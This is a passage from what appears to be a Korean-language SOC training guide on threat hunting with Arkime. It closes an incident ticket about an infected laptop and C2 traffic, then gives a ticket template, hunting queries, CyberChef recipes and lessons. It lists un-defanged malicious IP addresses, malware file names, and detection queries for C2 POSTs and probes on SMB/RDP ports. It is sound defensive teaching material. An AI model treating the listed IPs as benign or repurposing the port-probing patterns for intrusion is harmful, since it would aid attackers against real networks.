SMBv1-only probe refused by target (SMBv1 disabled). No share, user or file activity. SMBv1-only probing is typical of EternalBlue-style worm spreading. Lateral movement NOT successful.

[251117 2212, Analyst] Query: ip.dst == [50.87.248.17, 64.44.133.131, 203.176.135.102, 190.214.13.2, 185.14.31.98, 185.180.198.50, 51.254.164.244, 45.148.120.153, 199.247.13.144, 209.97.130.197] && ip.src != 10.3.11.194 -> 0 sessions.
No other internal host contacted the external IOCs. 10.3.11.119 and 10.3.11.218 show no sign of infection in network data.

RECOMMENDATIONS:
- Isolate LAPTOP-7XMV2SN (10.3.11.194) and hand to host IR (Velociraptor triage: process "VMMM;;;;영상ثافوزبت.exe", YAS20.exe, persistence).
- Reset otis.witherspoon domain password and all reused passwords (Facebook, Firefox); revoke Firefox account sessions.
- Block external IOCs (IPs / domains above) at perimeter.
- Malware analysis of YAS20.exe, cursor.png, imgpaper.png (Body MD5 above).
- Confirm SMBv1 disabled on all hosts; monitor 10.3.11.119 / 10.3.11.218.
```

### 빈 티켓 양식 { #ticket-template }

```text
#INDEX ENTRY#

[] -- <YYMMDD HHMM> -- <IP> <hostname> -- <description> -- <ticket link>


#TICKET METADATA#

OPERATORS:

TIME OF INCIDENT: <YYMMDD HH:MM:SS> UTC

RELATED TICKETS:
[] -- <datetime> - <IP> <hostname> - <description> - <ticket link>

DESCRIPTION OF INVESTIGATION: (NO MORE THAN TWO PARAGRAPHS)
- Internal IPs with hostnames / external IPs with domains
- Protocol and port / directionality (who initiated)
- File names / verdict with malware type (if known)
- Life-cycle stages: initial access, C2 (interval, state, bytes), exfil (time, what, bytes, method)


#IMPACTED MACHINES#

INTERNAL IP/s & HOSTNAME/s:

INTERNAL SOURCE PORT/s: (If Ephemeral Leave Blank.)

LATERAL DESTINATION IP/s & HOSTNAME/s: (If No Lateral Leave Blank.)

LATERAL DESTINATION PORT/s: (If No Lateral OR If Ephemeral Leave Blank.)


#EXTERNAL MACHINES#

EXTERNAL IP/s & HOSTNAME/s:

EXTERNAL SOURCE PORT/s: (If Ephemeral Leave Blank.)

EXTERNAL DESTINATION PORT/s: (If Ephemeral Leave Blank.)


#SEARCH QUERIES#

ARKIME (MOLOCH):

SPLUNK:


#EVIDENCE LOCATIONS#

Team<#>: /home/<username>/<evidence folder>/<evidence filename>


#OPERATION LOG / ANALYST NOTES#

[<time>, <operator>] <what you're looking for> - <Found | Not Found | Further Analysis Required>

[Time -- Operator]

Tool Output / Notes:

[<time>, <operator>] <tool output with timestamps, src/dst, all interesting fields> + <what it means>
```

---

## 복사용 쿼리 모음 { #query-sheet }

`<…>`를 바꿔서 쓰세요. 실습 여러 개를 읽어 들였다면 검색 앞에 `tags == <lab-tag> &&`를 붙입니다.

**큰 그림 잡기**

```text
ip.dst == <server-IP>
```

```text
ip.src == <internal-CIDR> && protocols == krb5
```

```text
ip.src == <host-IP> && protocols == krb5
```

```text
ip.src == <external-IP>
```

**HTTP**

```text
ip.src == <internal-CIDR> && protocols == http
```

```text
http.bodymagic == application/x-dosexec
```

```text
http.method == POST
```

```text
http.method == POST && ip.dst == <C2-IP> && http.uri == *<string>*
```

```text
http.user-agent == "<user-agent>"
```

```text
host.http == <domain> || ip.dst == <IP-1> || ip.dst == <IP-2>
```

**숨은 채널과 인증서**

```text
ip.src == <host-IP> && ip.dst != 10.0.0.0/8 && ip.dst != 172.16.0.0/12 && ip.dst != 192.168.0.0/16 && ip.dst != 224.0.0.0/4 && port.dst != 80 && port.dst != 443 && port.dst != 53
```

```text
ip.src == <host-IP> && protocols == tls
```

```text
tags == "cert:self-signed"
```

```text
cert.issuer.cn == <name> || cert.issuer.on == "<org name>" || cert.subject.cn == [<domain-1>, <domain-2>]
```

```text
ip.src == <host-IP> && (ip.dst == <IP-1> || ip.dst == <IP-2> || cert.issuer.cn == <name>)
```

**범위 확인**

```text
ip.src == <host-IP> && ip.dst == <internal-CIDR> && ip.dst != <DC-IP>
```

```text
ip.src == <host-IP> && ip.dst == <internal-CIDR> && port.dst == [445, 135, 139, 3389, 5985]
```

```text
ip.dst == [<IOC-IP-1>, <IOC-IP-2>, <IOC-IP-3>] && ip.src != <host-IP>
```

**어디를 누르나**

| 할 일 | 위치 |
|---|---|
| 필드 값과 개수 | SPI View → 섹션 → 필드 이름 클릭 또는 **Load All** |
| 값을 검색에 추가 | 값 클릭 → **and** / **or** / **and not** |
| 파일 링크 대신 본문 보기 | 세션 → **Packet Options → Hide Images & Files**, 그다음 `ascii` / `hex` |
| CyberChef용 원본 바이트 | 세션 → **Source Raw**(클라이언트 쪽) / **Destination Raw**(서버 쪽) |
| 티켓용 증거 | 세션 → **Download PCAP** |
| 데이터 시작·끝 | Sessions → **Start Time** 오름차순 / **Stop Time** 내림차순 |
| 시간대 | Settings → General → Timezone Format → **UTC** |

**사용한 CyberChef 레시피**

| 레시피 | 용도 |
|---|---|
| From Base64 | 끝이 `=` / `==`인 이상한 헤더 값 |
| URL Decode | `%2F` 같은 인코딩된 URI와 POST 본문 |
| From UNIX Timestamp (ms) | URL 속 `1583961855884` 같은 숫자 → `2020-03-11 21:24:15 UTC` |
| Detect File Type / Strings | Source/Destination Raw로 받은 본문 |
| Defang URL / Defang IP Addresses | 티켓의 IOC 목록 |

---

## 교훈 { #lessons }

- **시간 범위와 시간대부터 맞추기** — "Arkime에 아무것도 안 나와요"는 대부분 Last hour 기본값 때문입니다.
- **SPI View는 세기만 하고 짝을 지어 주지 않습니다.** 숫자가 맞아떨어지는 것(POST 5 = C2 URI 5)은 **추론**입니다. 티켓에 쓰기 전에 직접 검색이나 세션 상세로 확인하세요.
- **Issuer와 Subject에 같은 이름이 있다고 자체 서명은 아닙니다** — 사슬도 그렇게 보입니다. 인증서 한 장 안에서 확인하거나 `cert:self-signed` 태그를 쓰세요.
- **헌팅 전에 잡음 걸러내기:** 윈도우 업데이트/OCSP, 폰트, CDN, 멀티캐스트, NetBIOS 브로드캐스트.
- **평문 C2는 선물입니다.** Hide Images & Files로 POST 본문을 읽으면 피해자, 훔친 계정, 공격자의 다음 행동까지 나옵니다.
- **TCP 플래그와 바이트 방향을 읽어** "연결해서 주고받음"과 "찔러 봤다가 거절됨"을 구분하세요.
- **배제한 것도 증거입니다.** 무해한 외부 출발지, 거절된 SMB, 결과 0개인 범위 확인을 Not Found로 남기세요.
- 다른 사람이 읽는 문서에서는 **비밀 정보를 가리고 IOC를 무력화**하세요.
